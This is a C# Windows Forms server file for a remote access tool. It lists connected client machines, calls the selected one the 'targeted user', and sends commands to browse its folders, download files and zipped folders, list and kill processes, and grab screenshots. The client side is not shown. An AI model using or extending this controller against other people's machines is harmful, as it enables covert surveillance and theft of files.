using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;

namespace ComputerAccess
{
    public partial class myServer : Form
    {
        Socket socket;
        byte[] buffer = new byte[1024];
        FlowLayoutPanel panel;                      // connecterd users pannel
        ListBox listBox;  //directory files list
        ListBox proccess;
        List<Thread> lThreads = new List<Thread>();
        List<User> lUsers = new List<User>();
        User activeUser = null; // targeted user
        String path = "";
        TcpListener listener = new TcpListener(new IPEndPoint(0, 5555));

        public myServer()
        {
            InitializeComponent();
            myInit();
            
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Bind(new IPEndPoint(0, 10000));
            socket.Listen(100);
            socket.BeginAccept(new AsyncCallback(newConnection), null);
        }

        void newConnection(IAsyncResult AR)
        {
            Socket sck = socket.EndAccept(AR);
            lThreads.Add(new Thread(delegate()
                {
                    new User(sck, listBox);
                }));
            lThreads[lThreads.Count - 1].Name = "" + lThreads.Count;
            lThreads[lThreads.Count - 1].Start();

            lUsers.Add(new User(sck, listBox, proccess));

            showUser(sck);
            socket.BeginAccept(new AsyncCallback(newConnection), null);
        }

        void bufferClear()
        {
            Array.Clear(buffer, 0, buffer.Length);
        }

        void myInit()
        {
            listBox = new ListBox();
            listBox.Location = new System.Drawing.Point(150, 100);
            listBox.Size = new System.Drawing.Size(this.Size.Width - 465, this.Size.Height - 135);
            listBox.BorderStyle = BorderStyle.Fixed3D;
            listBox.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.ListBoxItemClicked);
            listBox.ScrollAlwaysVisible = false;
            this.Controls.Add(listBox);

            proccess = new ListBox();
            proccess.Location = new System.Drawing.Point(420, 100);
            proccess.Size = new System.Drawing.Size(this.Size.Width - 465, this.Size.Height - 135);
            proccess.BorderStyle = BorderStyle.Fixed3D;
            proccess.ScrollAlwaysVisible = false;
            this.Controls.Add(proccess);


            panel = new FlowLayoutPanel();
            panel.Location = new System.Drawing.Point(0, 100);
            panel.Size = new System.Drawing.Size(140, this.Size.Height - 139);
            panel.BorderStyle = BorderStyle.Fixed3D;
            panel.BackColor = Color.White;
            this.Controls.Add(panel);
        }

        void ListBoxItemClicked(object sender, MouseEventArgs e)
        {
            int index = this.listBox.IndexFromPoint(e.Location);
            if (index != System.Windows.Forms.ListBox.NoMatches)
            {
                String str = listBox.Items[index].ToString();
                listBox.Items.Clear();
                foreach (User item in lUsers)
                {
                    if (((IPEndPoint)item.socket.RemoteEndPoint).Address.ToString() == 
                        ((IPEndPoint)activeUser.socket.RemoteEndPoint).Address.ToString())
                    {
                        path += str;
                        if (path[path.Length - 1] != '\\' && path[path.Length - 1] != '/') path += "/";
                        try
                        {
                            item.socket.BeginSend(Encoding.Default.GetBytes(path), 0,
                              path.Length, SocketFlags.None, new AsyncCallback(messageSended), item.socket);
                        }
                        catch (Exception ex)
                        {
                            lUsers.Remove(item);
                            MessageBox.Show(ex.Message, "Connection Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            button_allUsers.Invoke(new Action(() => buttonAllUsers_Click(null, null)));
                        }
                        label1.Invoke(new Action(() => label1.Text = path));
                        return;
                    }
                }
            }
        }

        void showUser(Socket sck)
        {
            Button newUserBtn = new Button();
            newUserBtn.Name = ((IPEndPoint)sck.RemoteEndPoint).Address.ToString();
            newUserBtn.AutoSize = true;
            newUserBtn.Text = ("User IP: " + ((IPEndPoint)sck.RemoteEndPoint).Address.ToString());
            newUserBtn.Click += new System.EventHandler(this.newUserBtn_Click);

            panel.Invoke(new Action(() => panel.Controls.Add(newUserBtn)));
        }

        void newUserBtn_Click(object sender, EventArgs e)
        {
            try
            {
                buttonAllUsers_Click(null, null);
                listBox.Items.Clear();
                foreach (User item in lUsers)
                {
                    if (((IPEndPoint)item.socket.RemoteEndPoint).Address.ToString() == ((Button)sender).Name)
                    {
                        activeUser = item;
                        item.socket.BeginSend(Encoding.ASCII.GetBytes("0"), 0,
                            1, SocketFlags.None, new AsyncCallback(messageSended), item.socket);
                        
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "error");
                lUsers.Remove(activeUser);
                activeUser = null;
            }
        }

        void messageSended(IAsyncResult AR)
        {
            Socket sck = (Socket)AR.AsyncState;
            sck.EndSend(AR);
        }

        private void buttonAllUsers_Click(object sender, EventArgs e)
        {
            proccess.Items.Clear();
            listBox.Items.Clear();
            activeUser = null;
            path = "";
            panel.Controls.Clear();
            label1.Text = "";
            foreach (User item in lUsers)
            {
                showUser(item.socket);
            }
        }

        private void myServer_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (User item in lUsers)
            {
                item.socket.Send(Encoding.Default.GetBytes("1"));
                //item.socket.Shutdown(SocketShutdown.Both);
                //item.socket.Close();
            }
        }

        private void button_loadFile_Click(object sender, EventArgs e)
        {
            try
            {
                listBox.SelectedItem.ToString();
                if (listBox.SelectedItem.ToString().IndexOf('.') == -1) throw new Exception();
            }
            catch
            {
                MessageBox.Show("wrong file!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            byte[] info = new byte[1024];
            String str = "2" + path + listBox.SelectedItem.ToString();
            info = Encoding.Default.GetBytes(str);
            activeUser.socket.Send(info);

            /*byte[] clientAnswer = new byte[1024];
            int index = activeUser.socket.Receive(clientAnswer);
            byte[] resizeAnswer = new byte[index];
            Array.Copy(clientAnswer, resizeAnswer, index);
            str = Encoding.Unicode.GetString(resizeAnswer);
            if(resizeAnswer.Equals("wrongDirectory"))
            {
                MessageBox.Show("Its not a file!");
                return;
            }*/

            Thread thread = new Thread(new ThreadStart(Listen));
            thread.Start();
        }

        void Listen()
        {
            listener.Start();
            Thread.Sleep(5000);
            TcpClient client = listener.AcceptTcpClient();
            NetworkStream s = client.GetStream();
            Stream stream = new FileStream(@"C:\receivedFile", FileMode.Create, FileAccess.ReadWrite);
            Byte[] bytes = new Byte[1024];
            int length;

            while ((length = s.Read(bytes, 0, bytes.Length)) != 0)
            {
                stream.Write(bytes, 0, length);
            }
            MessageBox.Show("File Received");
            stream.Close();
            s.Close();
            client.Close();
            listener.Stop();
            
            
        }

        private void button_DirectoryUP_Click(object sender, EventArgs e)
        {
            if (path.Length == 0) return;
            listBox.Items.Clear();
            if (path.Length == 3)
            {
                activeUser.socket.Send(Encoding.Unicode.GetBytes("0"));
                path = "";
                return;
            }
            path = path.Remove(path.Length - 1, 1);
            for (int i = path.Length - 1; path[i] != '\\' && path[i] != '/'; i--)
            {
                path = path.Remove(path.Length - 1, 1);
            }
            activeUser.socket.BeginSend(Encoding.Default.GetBytes(path), 0,
                          path.Length, SocketFlags.None, new AsyncCallback(messageSended), activeUser.socket);
            label1.Invoke(new Action(() => label1.Text = path));
        }

        private void button_killProccess_Click(object sender, EventArgs e)
        {
            try
            {
                proccess.SelectedItem.ToString();
            }
            catch 
            {
                MessageBox.Show("wrong proccess!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            byte[] info = new byte[1024];
            String str = "4" + proccess.SelectedItem.ToString();
            info = Encoding.Default.GetBytes(str);
            activeUser.socket.Send(info);

        }

        private void button_loadProccess_Click(object sender, EventArgs e)
        {
            proccess.Items.Clear();
            if (activeUser == null)
            {
                MessageBox.Show("choose user 1rst!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            activeUser.socket.BeginSend(Encoding.ASCII.GetBytes("3"), 0,
                        1, SocketFlags.None, new AsyncCallback(messageSended), activeUser.socket);
        }

        private void button_loadFolder_Click(object sender, EventArgs e)
        {
            try
            {
                listBox.SelectedItem.ToString();
            }
            catch
            {
                MessageBox.Show("wrong file!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            byte[] info = new byte[1024];
            String str = "5" + path + listBox.SelectedItem.ToString();
            info = Encoding.Default.GetBytes(str);
            activeUser.socket.Send(info);

            Thread thread = new Thread(new ThreadStart(ListenForArchive));
            thread.Start();
        }

        void ListenForArchive()
        {
            listener.Start();
            Thread.Sleep(5000);
            TcpClient client = listener.AcceptTcpClient();
            NetworkStream s = client.GetStream();
            Stream stream = new FileStream(@"C:\receivedArchive.zip", FileMode.Create, FileAccess.ReadWrite);
            Byte[] bytes = new Byte[1024];
            int length;

            while ((length = s.Read(bytes, 0, bytes.Length)) != 0)
            {
                stream.Write(bytes, 0, length);
            }
            MessageBox.Show("File Received");
            stream.Close();
            s.Close();
            client.Close();
            listener.Stop();
        }

        void ListenForImage()
        {
            listener.Start();
            Thread.Sleep(5000);
            TcpClient client = listener.AcceptTcpClient();
            NetworkStream s = client.GetStream();
            MemoryStream stream = new MemoryStream();
            Byte[] bytes = new Byte[1024];
            int length;
            while ((length = s.Read(bytes, 0, bytes.Length)) != 0)
            {
                stream.Write(bytes, 0, length);
            }

            ImageConverter converter = new ImageConverter();
            Image img = (Image)converter.ConvertFrom(stream.ToArray());
            Bitmap bitmap = new Bitmap(img);
            new ScreenForm(bitmap).ShowDialog();

            stream.Close();
            s.Close();
            client.Close();
            listener.Stop();
        }

        private void button_showDisplay_Click(object sender, EventArgs e)
        {
            if (activeUser == null)
            {
                MessageBox.Show("Choose user 1rst!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            activeUser.socket.Send(Encoding.Default.GetBytes("6"));
            Thread thread = new Thread(new ThreadStart(ListenForImage));
            thread.Start();
        }


    }
}
